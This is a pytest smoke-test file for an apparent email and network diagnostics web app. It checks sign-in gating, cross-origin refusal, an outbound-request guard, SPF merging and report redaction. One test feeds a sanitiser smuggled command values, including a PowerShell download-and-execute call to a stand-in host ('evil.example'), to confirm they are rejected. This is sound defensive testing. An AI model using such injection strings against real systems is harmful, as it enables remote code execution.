"""Offline smoke tests: the app loads, pages are gated, parsers work on fictional samples."""
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import main
from app.core import auth

SAMPLES = Path(main.STATIC) / "samples"


@pytest.fixture(scope="module")
def client():
    return TestClient(main.app, base_url="http://testserver")


def test_all_modules_load():
    assert main.MODULE_ERRORS == {}


def test_health_is_public_and_hides_internals(client):
    r = client.get("/api/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"
    assert "module_errors" not in r.json()


def test_security_headers(client):
    r = client.get("/api/health")
    assert "script-src 'self'" in r.headers["content-security-policy"]
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["cache-control"] == "no-store"


def test_ui_and_api_require_sign_in(client):
    r = client.get("/", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/login"
    assert client.get("/api/meta").status_code == 401
    assert client.get("/core.js").status_code == 401
    assert client.post("/api/headers/analyze", json={"raw": "x"}).status_code == 401


def test_cross_origin_post_refused(client):
    r = client.post("/api/auth/login", json={"username": "a", "password": "b"}, headers={"Origin": "https://evil.example"})
    assert r.status_code == 403


def test_login_requires_json(client):
    r = client.post("/api/auth/login", data={"username": "a", "password": "b"})
    assert r.status_code == 415


def test_body_size_cap(client):
    r = client.post("/api/headers/analyze", content=b"x" * 10, headers={"content-length": "6000000", "content-type": "application/json"})
    assert r.status_code == 413


def test_password_hashing_and_policy():
    h = auth.hash_password("correct horse battery staple")
    assert auth.verify_password("correct horse battery staple", h)
    assert not auth.verify_password("wrong", h)
    with pytest.raises(auth.AuthError):
        auth.check_password_policy("short", "bob")
    with pytest.raises(auth.AuthError):
        auth.check_password_policy("bob-is-my-name-123", "bob")


def test_totp_rfc6238_vector():
    # RFC 6238 SHA-1 test secret "12345678901234567890", T=59s -> step 1 -> 94287082 (8 digits) / 287082 (6 digits)
    import base64
    secret = base64.b32encode(b"12345678901234567890").decode()
    assert auth._totp_at(secret, 1) == "287082"


def test_first_run_needs_setup(client):
    r = client.get("/api/auth/status")
    assert r.status_code == 200
    assert r.json().get("setup_required") is True


def test_header_analyzer_detects_loop():
    from app.modules.headers import analyze_headers
    res = analyze_headers((SAMPLES / "loop-headers.txt").read_text(encoding="utf-8"))
    assert res["loop"]["verdict"] == "likely"
    assert "Mimecast → Microsoft 365" in res["loop"]["repeated_handoffs"]


def test_ndr_decoder():
    from app.modules.ndr import analyze_ndr
    res = analyze_ndr((SAMPLES / "ndr-loop.txt").read_text(encoding="utf-8"))
    assert res["is_loop"]
    assert res["codes"]


def test_spf_merge_keeps_strictest_all():
    from app.modules.spf import merge_records
    merged = merge_records(["v=spf1 include:spf.protection.outlook.com ~all", "v=spf1 include:_spf.google.com -all"])
    rec = merged["record"] if isinstance(merged, dict) else merged
    assert "include:spf.protection.outlook.com" in rec and "include:_spf.google.com" in rec
    assert rec.endswith("-all") and "+all" not in rec


def test_outbound_guard_refuses_metadata_and_loopback():
    from app.core.outbound import resolve_safe
    for host in ("127.0.0.1", "169.254.169.254", "::1"):
        with pytest.raises(ValueError):
            resolve_safe(host)


def test_throttle_keys_group_ipv6_by_64():
    assert auth._ip_key("2001:db8:1:2::5") == auth._ip_key("2001:db8:1:2:ffff::9")
    assert auth._ip_key("2001:db8:1:3::5") != auth._ip_key("2001:db8:1:2::5")
    assert auth._ip_key("::ffff:192.0.2.7") == "192.0.2.7"
    assert auth._ip_key("192.0.2.7") == "192.0.2.7"


def test_command_values_are_validated():
    from app.core import cmdsafe
    assert cmdsafe.email("x@contoso.com; iex(iwr http://evil.example)") == "user@contoso.com"
    assert cmdsafe.dns_name("x$(calc).contoso.com") == "www.contoso.com"
    assert cmdsafe.url('http://ca.example/x.crt"; Start-Process calc; "') is None
    assert cmdsafe.ps_quote("it's") == "'it''s'"


def test_encoded_dot_segments_refused(client):
    assert client.get("/api/auth/..%2f..%2fcore.js").status_code == 404


def test_aadsts_list_regex_is_linear():
    import time
    from app.modules.identity import analyze_signin
    t = time.monotonic()
    with pytest.raises(ValueError):
        analyze_signin("1" * 5000 + "x")
    assert time.monotonic() - t < 2


# ---------------------------------------------------------------- active tests, saved reports, branding
@pytest.fixture()
def open_client(monkeypatch):
    """A client with sign-in turned off, to reach tool routes without a session."""
    monkeypatch.setattr(auth, "AUTH_ENABLED", False)
    return TestClient(main.app, base_url="http://testserver")


def test_active_tests_require_authorization_header(open_client):
    # Refused before any connection is attempted.
    assert open_client.get("/api/net/ports?host=192.0.2.10&ports=443").status_code == 428
    assert open_client.get("/api/net/tls?h=192.0.2.10").status_code == 428
    assert open_client.post("/api/smtp/test", json={"target": "192.0.2.10"}).status_code == 428


def test_passive_tools_need_no_authorization(open_client):
    r = open_client.get("/api/meta")
    assert r.status_code == 200 and "org" in r.json() and "saving" in r.json()


def test_workspace_save_list_get_delete():
    from app.core import workspace
    assert workspace.AVAILABLE
    data = {"domain": "contoso.com", "headline": "contoso.com: test", "posture": {"grade": "B", "score": 84},
            "talking_points": [{"kind": "risk", "title": "r"}, {"kind": "question", "title": "q"}], "website": {"title": "Contoso | Home"}}
    rid = workspace.remember("discovery", "contoso.com", data)
    saved = workspace.save(rid, "alice")
    items = workspace.list_saved("discovery", "contoso.com")
    assert items and items[0]["id"] == saved["id"] and items[0]["grade"] == "B" and items[0]["org"] == "Contoso"
    assert items[0]["counts"] == {"risk": 1, "opportunity": 0, "question": 1}
    assert workspace.get(saved["id"])["data"]["headline"] == "contoso.com: test"
    with pytest.raises(PermissionError):
        workspace.delete(saved["id"], "bob", is_admin=False)
    workspace.delete(saved["id"], "alice", is_admin=False)
    with pytest.raises(LookupError):
        workspace.get(saved["id"])


def test_workspace_refuses_unknown_result_ids():
    from app.core import workspace
    with pytest.raises(ValueError):
        workspace.save("not-a-real-id", "alice")


def test_assessments_api(open_client):
    assert open_client.post("/api/assessments", json={"result_id": "nope"}).status_code == 400
    assert open_client.get("/api/assessments/zzzz").status_code == 404
    r = open_client.get("/api/assessments?kind=discovery")
    assert r.status_code == 200 and r.json()["available"] is True


def test_branding_settings_are_sanitised(open_client):
    r = open_client.put("/api/admin/settings", json={"org_name": "Contoso IT\x00\x1b Services", "org_contact": "help@contoso.example"})
    assert r.status_code == 200
    assert r.json()["org_name"] == "Contoso IT Services"
    assert open_client.get("/api/meta").json()["org"]["name"] == "Contoso IT Services"


# ---------------------------------------------------------------- data-source hygiene
class _A:
    def __init__(self, address):
        self.address = address


def test_blocklist_canary_marks_refusing_lists_unusable(monkeypatch):
    from app.modules import blacklist

    blacklist._canary_cache.clear()
    answers = {
        "2.0.0.127.bl.spamcop.net": ([_A("127.0.0.2")], {"status": "ok", "error": None}),        # healthy list
        "2.0.0.127.zen.spamhaus.org": ([], {"status": "nxdomain", "error": None}),               # silently refused
        "test.uribl.com.multi.uribl.com": ([_A("127.0.0.1")], {"status": "ok", "error": None}),  # URIBL refusal code
    }
    monkeypatch.setattr(blacklist, "resolve", lambda res, name, rtype, fallback=False: answers.get(name, ([], {"status": "nxdomain", "error": None})))
    ok = next(l for l in blacklist.IP_LISTS if l["zone"] == "bl.spamcop.net")
    zen = next(l for l in blacklist.IP_LISTS if l["zone"] == "zen.spamhaus.org")
    uribl = next(l for l in blacklist.DOMAIN_LISTS if l["zone"] == "multi.uribl.com")
    assert blacklist._canary(None, "test", ok, False) is None
    assert "can't be trusted" in blacklist._canary(None, "test", zen, False)
    assert "refused" in blacklist._canary(None, "test", uribl, True).lower()


def test_defunct_blocklists_removed():
    from app.modules import blacklist
    zones = {l["zone"] for l in blacklist.IP_LISTS + blacklist.DOMAIN_LISTS}
    assert "ix.dnsbl.manitu.net" not in zones and "db.wpbl.info" not in zones


def test_rdap_bootstrap_matching():
    from app.core import rdap
    dns = [[["com", "net"], ["https://rdap.verisign.com/com/v1/"]], [["uk"], ["https://rdap.nominet.uk/uk/"]]]
    ipv4 = [[["8.0.0.0/8"], ["https://rdap.arin.net/registry/", "http://rdap.arin.net/registry/"]],
            [["8.8.0.0/16"], ["https://more.specific.example/"]]]
    assert rdap.base_url("dns", "github.com", dns) == "https://rdap.verisign.com/com/v1/"
    assert rdap.base_url("dns", "bbc.co.uk", dns) == "https://rdap.nominet.uk/uk/"
    assert rdap.base_url("dns", "contoso.de", dns) is None
    assert rdap.base_url("ipv4", "8.8.8.8", ipv4) == "https://more.specific.example/"
    assert rdap.base_url("ipv4", "8.1.2.3", ipv4) == "https://rdap.arin.net/registry/"


def test_saved_reports_drop_personal_emails():
    from app.core.workspace import _redact
    out = _redact({"soa": {"contact": "john.smith@contoso.com"}, "dmarc": "v=DMARC1; rua=mailto:dmarc@contoso.com,mailto:jane@contoso.com",
                   "list": ["hostmaster@contoso.com", "f4a1b2c3d4e5@rua.vendor.example"]})
    assert out["soa"]["contact"] == "[name removed]@contoso.com"
    assert "mailto:dmarc@contoso.com" in out["dmarc"] and "jane@" not in out["dmarc"]
    assert out["list"] == ["hostmaster@contoso.com", "f4a1b2c3d4e5@rua.vendor.example"]
